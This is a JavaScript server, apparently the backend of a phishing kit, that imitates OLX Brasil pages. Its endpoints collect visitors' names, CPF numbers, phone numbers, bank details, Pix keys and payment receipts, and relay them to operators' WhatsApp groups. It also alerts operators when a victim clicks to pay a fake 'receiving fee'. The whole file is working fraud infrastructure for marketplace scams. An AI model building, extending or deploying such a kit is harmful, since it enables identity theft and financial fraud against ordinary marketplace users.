// Variáveis globais
let conn = null;
let isConnected = false;
let qrCode = null;

// Inicialização do WhatsApp
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
} = require("baileys");
const pino = require("pino");
// const fs = require("fs");

// Função para obter o chatId associado a um código de produto
function obterGrupoPorCodigo(codigo) {
  try {
    const caminhoArquivoGrupos = path.join(__dirname, "data/groups.json");
    if (fs.existsSync(caminhoArquivoGrupos)) {
      const conteudo = fs.readFileSync(caminhoArquivoGrupos, 'utf8');
      if (conteudo.trim()) {
        const grupos = JSON.parse(conteudo);
        return grupos[codigo] || "";
      }
    }
    return "";
  } catch (erro) {
    console.error("Erro ao ler dados dos grupos:", erro);
    return "";
  }
}

// Função para obter o chatId do último grupo usado (para compatibilidade)
function obterGrupoChatId() {
  try {
    const caminhoArquivoGrupo = path.join(__dirname, "data/group.json");
    if (fs.existsSync(caminhoArquivoGrupo)) {
      const dados = JSON.parse(fs.readFileSync(caminhoArquivoGrupo, 'utf8'));
      return dados.chatId || "";
    }
    return "";
  } catch (erro) {
    console.error("Erro ao ler dados do grupo:", erro);
    return "";
  }
}

async function connectToWhatsApp() {
  try {
    // Usar armazenamento de autenticação em múltiplos arquivos
    const { state, saveCreds } = await useMultiFileAuthState(
      "./bot/auth_info_baileys"
    );

    // Criar socket do WhatsApp
    conn = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
    });

    // Salvar credenciais quando autenticado
    conn.ev.on("creds.update", saveCreds);

    // Quando a conexão for atualizada
    conn.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect, qr } = update;

      // Armazenar QR code para exibi-lo na interface administrativa (se necessário)
      if (qr) {
        // Exibe o QR manualmente
        const qrcode = require("qrcode-terminal");
        qrcode.generate(qr, { small: true });
      }

      // Se conectado
      if (connection === "open") {
        isConnected = true;
        console.log("Conectado ao WhatsApp");
        
        // Obter chatId salvo e enviar mensagem se existir
        const grupoChatId = obterGrupoChatId();
        if (grupoChatId) {
          conn.sendMessage(grupoChatId, {
            text: "*Conexão estabelecida com sucesso!*",
          }).catch((error) => {
            console.log("Erro ao enviar mensagem de conexão:", error);
          })
        }

        // const { exec } = require("child_process");
        // exec(
        //   "cd bot/auth_info_baileys && find . ! -name 'creds.json' -type f -exec rm -f {} +"
        // );
      }

      // Se desconectado
      if (connection === "close") {
        isConnected = false;
        const shouldReconnect =
          lastDisconnect?.error?.output?.statusCode !==
          DisconnectReason.loggedOut;

        console.log(
          "Conexão fechada devido a ",
          lastDisconnect?.error,
          ", reconectando: ",
          shouldReconnect
        );

        // Reconectar se não estiver deslogado
        if (shouldReconnect) {
          connectToWhatsApp();
        }
      }
    });

    // Escutar mensagens recebidas (para futuras implementações)
    const dataVendas = JSON.parse(
      fs.readFileSync(path.join(__dirname, "data", "vendas.json"))
    );

    conn.ev.on("messages.upsert", async (m) => {
      try {
        if (!m.messages) return;
        const mek = m.messages[0];
        if (!mek.message) return;
        if (mek.key.fromMe) return;
        if (mek.key && mek.key.remoteJid === "status@broadcast") return;

        console.log("Mensagem recebida:", mek);
        require("./bot/system/admins")(conn, mek, dataVendas);
      } catch (error) {
        console.error("Erro ao processar mensagem:", error);
      }
    });
  } catch (error) {
    console.error("Erro na conexão com WhatsApp:", error);
  }
}

// Conexão do Site:

const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");

// Configurar armazenamento para uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadDir = path.join(__dirname, "uploads");
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const fileExt = path.extname(file.originalname);
    cb(null, `comprovante-${uuidv4()}${fileExt}`);
  },
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limite
  fileFilter: function (req, file, cb) {
    const allowedTypes = /jpeg|jpg|png|pdf/;
    const extname = allowedTypes.test(
      path.extname(file.originalname).toLowerCase()
    );
    const mimetype = allowedTypes.test(file.mimetype);

    if (extname && mimetype) {
      return cb(null, true);
    }
    cb(
      new Error("Apenas arquivos de imagem (JPEG, PNG) ou PDF são permitidos!")
    );
  },
});

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para logs de requisições
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Middleware para processar JSON
app.use(express.json());

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, "public")));

// Função para verificar status do WhatsApp
function verificarStatusWhatsApp() {
  console.log(
    `Status da conexão WhatsApp: ${isConnected ? "Conectado" : "Desconectado"}`
  );
  return isConnected;
}

// Função para enviar mensagem WhatsApp para um grupo específico
async function enviarMensagemWhatsAppParaGrupo(mensagem, grupoChatId) {
  console.log("Iniciando envio de mensagem WhatsApp para grupo específico...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }

    // Verificar se o ID do grupo foi fornecido
    if (!grupoChatId) {
      console.error("ID do grupo não fornecido");
      return { success: false, message: "ID do grupo não fornecido" };
    }
    
    console.log("Tentando enviar mensagem para o grupo específico...");

    // Enviar a mensagem
    await conn.sendMessage(grupoChatId, { text: mensagem });
    console.log("Mensagem enviada com sucesso!");

    return { success: true, message: "Mensagem enviada com sucesso" };
  } catch (error) {
    console.error("Erro detalhado ao enviar mensagem:", error);
    return {
      success: false,
      message: `Erro ao enviar mensagem: ${error.message}`,
      error: error,
    };
  }
}

// Função melhorada para enviar mensagem WhatsApp (usa o último grupo salvo)
async function enviarMensagemWhatsApp(mensagem) {
  console.log("Iniciando envio de mensagem WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }

    // Obter o ID do grupo salvo em group.json
    const grupoChatId = obterGrupoChatId();
    if (!grupoChatId) {
      console.error("Grupo de destino não configurado. Execute o comando /novo primeiro.");
      return { success: false, message: "Grupo de destino não configurado" };
    }
    
    console.log("Tentando enviar mensagem para o grupo configurado...");

    // Enviar a mensagem
    await conn.sendMessage(grupoChatId, { text: mensagem });
    console.log("Mensagem enviada com sucesso!");

    return { success: true, message: "Mensagem enviada com sucesso" };
  } catch (error) {
    console.error("Erro detalhado ao enviar mensagem:", error);
    return {
      success: false,
      message: `Erro ao enviar mensagem: ${error.message}`,
      error: error,
    };
  }
}

// Função para enviar arquivo para um grupo específico pelo WhatsApp
async function enviarArquivoWhatsAppParaGrupo(filePath, caption, grupoChatId) {
  console.log("Iniciando envio de arquivo WhatsApp para grupo específico...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }
    
    // Verificar se o ID do grupo foi fornecido
    if (!grupoChatId) {
      console.error("ID do grupo não fornecido");
      return { success: false, message: "ID do grupo não fornecido" };
    }

    // Verificar se o arquivo existe
    if (!fs.existsSync(filePath)) {
      console.error(`Arquivo não encontrado: ${filePath}`);
      return { success: false, message: "Arquivo não encontrado" };
    }

    // Lê o arquivo para buffer
    const fileBuffer = fs.readFileSync(filePath);
    const fileExt = path.extname(filePath).toLowerCase();
    const fileName = path.basename(filePath);

    // Determinar o tipo de mídia com base na extensão
    let messageContent;
    if (fileExt === ".pdf") {
      messageContent = {
        document: fileBuffer,
        fileName: fileName,
        caption: caption,
      };
    } else {
      // para imagens (.jpg, .png, etc)
      messageContent = {
        image: fileBuffer,
        caption: caption,
      };
    }

    // Enviar o arquivo para o WhatsApp
    await conn.sendMessage(grupoChatId, messageContent);
    console.log("Arquivo enviado com sucesso!");

    return { success: true, message: "Arquivo enviado com sucesso" };
  } catch (error) {
    console.error("Erro ao enviar arquivo:", error);
    return {
      success: false,
      message: `Erro ao enviar arquivo: ${error.message}`,
      error: error,
    };
  }
}

// Função para enviar arquivo pelo WhatsApp (usando o último grupo salvo)
async function enviarArquivoWhatsApp(filePath, caption) {
  console.log("Iniciando envio de arquivo WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }

    // Obter o ID do grupo salvo em group.json
    const grupoChatId = obterGrupoChatId();
    if (!grupoChatId) {
      console.error("Grupo de destino não configurado. Execute o comando /novo primeiro.");
      return { success: false, message: "Grupo de destino não configurado" };
    }

    // Verificar se o arquivo existe
    if (!fs.existsSync(filePath)) {
      console.error(`Arquivo não encontrado: ${filePath}`);
      return { success: false, message: "Arquivo não encontrado" };
    }

    // Lê o arquivo para buffer
    const fileBuffer = fs.readFileSync(filePath);
    const fileExt = path.extname(filePath).toLowerCase();
    const fileName = path.basename(filePath);

    // Determinar o tipo de mídia com base na extensão
    let messageContent;
    if (fileExt === ".pdf") {
      messageContent = {
        document: fileBuffer,
        fileName: fileName,
        caption: caption,
      };
    } else {
      // para imagens (.jpg, .png, etc)
      messageContent = {
        image: fileBuffer,
        caption: caption,
      };
    }

    // Enviar o arquivo para o WhatsApp
    await conn.sendMessage(grupoChatId, messageContent);
    console.log("Arquivo enviado com sucesso!");

    return { success: true, message: "Arquivo enviado com sucesso" };
  } catch (error) {
    console.error("Erro ao enviar arquivo:", error);
    return {
      success: false,
      message: `Erro ao enviar arquivo: ${error.message}`,
      error: error,
    };
  }
}

// Endpoint para receber dados bancários e enviar para WhatsApp
app.post("/api/enviar-dados-bancarios", async (req, res) => {
  console.log("Recebendo requisição para enviar dados bancários");

  try {
    const dados = req.body;
    console.log("Dados recebidos:", JSON.stringify(dados));

    // Verificar se os dados são válidos
    if (!dados.nome || !dados.email || !dados.telefone || !dados.cpf) {
      console.error("Dados incompletos recebidos");
      return res.status(400).json({
        success: false,
        message: "Dados pessoais ou de endereço incompletos",
      });
    }

    // Obter o código do produto, se disponível
    const codigoProduto = dados.codigoProduto || dados.codigo || "";

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
      });
    }

    // Formatar mensagem com os dados recebidos
    const mensagem =
      `*Novos dados bancários recebidos*\n\n` +
      `*Dados Pessoais:*\n` +
      `Nome: ${dados.nome}\n` +
      `Email: ${dados.email}\n` +
      `Telefone: ${dados.telefone}\n` +
      `CPF: ${dados.cpf}\n\n` +
      `*Dados Bancários:*\n` +
      `Banco: ${dados.banco}\n` +
      `Tipo de Chave Pix: ${dados["chave-pix-tipo"]}\n` +
      `Chave Pix: ${dados["chave-pix"]}\n\n` +
      `Código do produto: ${codigoProduto}\n` +
      `Enviado em: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar mensagem para o WhatsApp com o chatId correto para o produto
    let resultado;
    if (codigoProduto) {
      // Obter o grupo associado ao código do produto
      const grupoProduto = obterGrupoPorCodigo(codigoProduto);
      if (grupoProduto) {
        // Enviar para o grupo específico do produto
        resultado = await enviarMensagemWhatsAppParaGrupo(mensagem, grupoProduto);
      } else {
        // Fallback para o último grupo usado
        resultado = await enviarMensagemWhatsApp(mensagem);
      }
    } else {
      // Se não tiver código do produto, usa o último grupo
      resultado = await enviarMensagemWhatsApp(mensagem);
    }

    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Dados enviados com sucesso para o WhatsApp",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar mensagem para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar dados bancários:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Endpoint para obter dados da venda pelo ID
app.get("/api/venda/:id", (req, res) => {
  const id = req.params.id;

  // Carregar dados das vendas
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);

    // Buscar venda pelo ID
    const venda = vendas.find((v) => v.codigo === id);

    if (venda) {
      // Adicionando um pequeno atraso para simular latência de rede (apenas para desenvolvimento)
      setTimeout(() => {
        res.json(venda);
      }, 300);
    } else {
      res.status(404).json({
        error: "Venda não encontrada",
        message: "Não foi possível encontrar uma venda com o código informado.",
      });
    }
  } catch (error) {
    console.error("Erro ao buscar dados da venda:", error);
    res.status(500).json({
      error: "Erro ao processar requisição",
      message:
        "Ocorreu um erro ao processar sua solicitação. Tente novamente mais tarde.",
    });
  }
});

// Endpoint para compatibilidade com URLs que usam "pag" na rota
app.get("/pag", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Endpoint para acessar a página de dados bancários (usando .html em vez de .php)
app.get("/pag/dados.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "dados.html"));
});

// Endpoint para acessar a página de alerta
app.get("/pag/alerta.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
});

// Endpoint para simular .php (para compatibilidade com o formato solicitado)
app.get("/pag/alerta.php", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
});

// Endpoint para buscar todas as vendas (útil para dashboard)
app.get("/api/vendas", (req, res) => {
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);
    res.json(vendas);
  } catch (error) {
    console.error("Erro ao buscar todas as vendas:", error);
    res.status(500).json({ error: "Erro ao processar requisição" });
  }
});

// Endpoint para termos de uso (retorna um JSON simples)
app.get("/api/termos", (req, res) => {
  res.json({
    titulo: "Termos de Uso da OLX Brasil",
    atualizado: "01/04/2025",
    conteudo: "Este documento apresenta os termos e condições gerais...",
  });
});

// Endpoint para política de privacidade (retorna um JSON simples)
app.get("/api/privacidade", (req, res) => {
  res.json({
    titulo: "Política de Privacidade da OLX Brasil",
    atualizado: "01/04/2025",
    conteudo: "A OLX Brasil está comprometida em proteger sua privacidade...",
  });
});

// Endpoint para receber comprovante e enviar via WhatsApp
app.post(
  "/api/enviar-comprovante",
  upload.single("comprovante"),
  async (req, res) => {
    console.log("Recebendo requisição para enviar comprovante");

    try {
      // Verificar se o arquivo foi recebido
      if (!req.file) {
        console.error("Nenhum arquivo recebido");
        return res.status(400).json({
          success: false,
          message: "Nenhum arquivo de comprovante recebido",
        });
      }

      console.log("Arquivo recebido:", req.file);

      // Verificar status do WhatsApp antes de tentar enviar
      if (!verificarStatusWhatsApp()) {
        console.error("Tentativa de envio com WhatsApp desconectado");
        return res.status(503).json({
          success: false,
          message:
            "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        });
      }

      // Extrair dados do formulário
      const chavePix = req.body.chavePix || "Não informada";
      const valor = req.body.valor || "Não informado";
      const codigoProduto = req.body.codigoProduto || req.body.codigo || "";

      // Formatar mensagem para o comprovante
      const caption =
        `*COMPROVANTE DE PAGAMENTO RECEBIDO*\n\n` +
        `*Dados do Pagamento:*\n` +
        `Valor: R$ ${valor}\n` +
        `Chave PIX: ${chavePix}\n` +
        `Código do produto: ${codigoProduto}\n\n` +
        `Recebido em: ${new Date().toLocaleString("pt-BR")}`;

      // Enviar o arquivo pelo WhatsApp com o chatId correto para o produto
      let resultado;
      if (codigoProduto) {
        // Obter o grupo associado ao código do produto
        const grupoProduto = obterGrupoPorCodigo(codigoProduto);
        if (grupoProduto) {
          // Enviar para o grupo específico do produto
          resultado = await enviarArquivoWhatsAppParaGrupo(req.file.path, caption, grupoProduto);
        } else {
          // Fallback para o último grupo usado
          resultado = await enviarArquivoWhatsApp(req.file.path, caption);
        }
      } else {
        // Se não tiver código do produto, usa o último grupo
        resultado = await enviarArquivoWhatsApp(req.file.path, caption);
      }

      if (resultado.success) {
        res.json({
          success: true,
          message: "Comprovante enviado com sucesso para o WhatsApp",
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Erro ao enviar comprovante para o WhatsApp",
          error: resultado.message,
        });
      }
    } catch (error) {
      console.error("Erro ao processar envio de comprovante:", error);
      res.status(500).json({
        success: false,
        message: "Erro ao processar sua solicitação",
        error: error.message,
      });
    }
  }
);

// Endpoint para notificar quando o cliente clica em "Continuar"
app.post("/api/notificar-clique-continuar", async (req, res) => {
  console.log("Cliente clicou em botão de ação");

  try {
    const dados = req.body;
    const codigoVenda = dados.codigo || "Não informado";
    const nomeProduto = dados.produto || "Não informado";
    const acao = dados.acao || "continuar";
    const valor = dados.valor || "";

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error(
        "WhatsApp desconectado - não foi possível enviar notificação de clique"
      );
      return res.status(503).json({
        success: false,
        message: "Serviço do WhatsApp indisponível",
      });
    }

    // Definir mensagem com base na ação
    let mensagem;

    if (acao === "clique_taxa") {
      mensagem =
        `*⚠️ CLIENTE VAI PAGAR A TAXA DE RECEBIMENTO DE VALORES ⚠️*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n` +
        `Valor da taxa: R$ ${valor}\n\n` +
        `Cliente clicou no botão para pagar a taxa de recebimento de valores e está sendo redirecionado para a página de pagamento.\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    } else {
      mensagem =
        `*Cliente clicou em CONTINUAR*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n\n` +
        `Cliente viu a mensagem de conclusão e clicou em continuar\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    }

    // Enviar mensagem para o WhatsApp com o chatId correto para o produto
    let resultado;
    
    // Verificar se temos o código do produto
    if (codigoVenda && codigoVenda !== "Não informado") {
      // Obter o grupo associado ao código do produto
      const grupoProduto = obterGrupoPorCodigo(codigoVenda);
      if (grupoProduto) {
        // Enviar para o grupo específico do produto
        resultado = await enviarMensagemWhatsAppParaGrupo(mensagem, grupoProduto);
      } else {
        // Fallback para o último grupo usado
        resultado = await enviarMensagemWhatsApp(mensagem);
      }
    } else {
      // Se não tiver código do produto, usa o último grupo
      resultado = await enviarMensagemWhatsApp(mensagem);
    }

    if (resultado.success) {
      res.json({
        success: true,
        message: "Notificação enviada com sucesso",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar notificação para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar notificação de clique:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Importar o módulo qrcodepagamentos
const qrcodePagamentos = require('./js/qrcodepagamentos');

// Endpoint para gerar QR Code PIX
app.get("/api/gerar-qrcode-pix", async (req, res) => {
  try {
    console.log("Gerando QR Code PIX...");
    const resultado = await qrcodePagamentos();
    
    if (!resultado || !resultado.imgBase64) {
      console.error("Erro ao gerar QR Code PIX: Resultado inválido");
      return res.status(500).json({
        success: false,
        message: "Não foi possível gerar o QR Code PIX",
        resultado: resultado
      });
    }
    
    console.log("QR Code gerado com sucesso!");
    res.json({
      success: true,
      qrCodeBase64: resultado.imgBase64,
      pixTitle: resultado.pixTitle
    });
  } catch (error) {
    console.error("Erro ao gerar QR Code PIX:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao gerar QR Code PIX",
      error: error.message
    });
  }
});

// Endpoint para receber dúvidas da Central de Ajuda e enviar via WhatsApp
app.post("/api/enviar-duvida-ajuda", async (req, res) => {
  try {
    console.log("Recebida dúvida da Central de Ajuda:", req.body);

    const { nome, email, telefone, categoria, mensagem } = req.body;

    // Validação básica
    if (!nome || !email || !categoria || !mensagem) {
      return res.status(400).json({
        success: false,
        message: "Dados obrigatórios não fornecidos",
      });
    }

    // Formatação da mensagem para WhatsApp
    const dataAtual = new Date().toLocaleString("pt-BR");
    
    const mensagemWhatsApp = `🆘 *NOVA DÚVIDA - CENTRAL DE AJUDA*

📅 *Data:* ${dataAtual}

👤 *DADOS DO CLIENTE:*
• Nome: ${nome}
• E-mail: ${email}
• Telefone: ${telefone || "Não informado"}

📂 *CATEGORIA:* ${categoria.toUpperCase()}

💬 *DÚVIDA/MENSAGEM:*
${mensagem}

---
_Enviado automaticamente pela Central de Ajuda OLX_`;

    // Tentar enviar via WhatsApp
    const resultadoWhatsApp = await enviarMensagemWhatsApp(mensagemWhatsApp);

    if (resultadoWhatsApp.success) {
      // Log para auditoria
      console.log(`✅ Dúvida enviada via WhatsApp - Cliente: ${nome} (${email})`);
      
      res.json({
        success: true,
        message: "Sua dúvida foi enviada com sucesso! Nossa equipe entrará em contato em breve.",
      });
    } else {
      console.error("❌ Erro ao enviar dúvida via WhatsApp:", resultadoWhatsApp);
      
      // Mesmo se falhar o WhatsApp, retorna sucesso para o usuário
      // (pode implementar fallback como email posteriormente)
      res.json({
        success: true,
        message: "Sua dúvida foi recebida! Nossa equipe entrará em contato em breve.",
      });
    }

  } catch (error) {
    console.error("Erro ao processar dúvida da Central de Ajuda:", error);
    res.status(500).json({
      success: false,
      message: "Erro interno do servidor. Tente novamente em alguns minutos.",
    });
  }
});

// Endpoint para acessar a página da Central de Ajuda
app.get("/pag/central-ajuda.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "central-ajuda.html"));
});

// Rota padrão para qualquer outra solicitação (SPA pattern)
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Middleware para tratamento de erros
app.use((err, req, res, next) => {
  console.error("Erro na aplicação:", err);
  res
    .status(500)
    .send("Ocorreu um erro no servidor. Tente novamente mais tarde.");
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
  console.log(`Acesse: http://localhost:${PORT}/pag/?id=KFTKWNQVMD`);
  connectToWhatsApp();
});
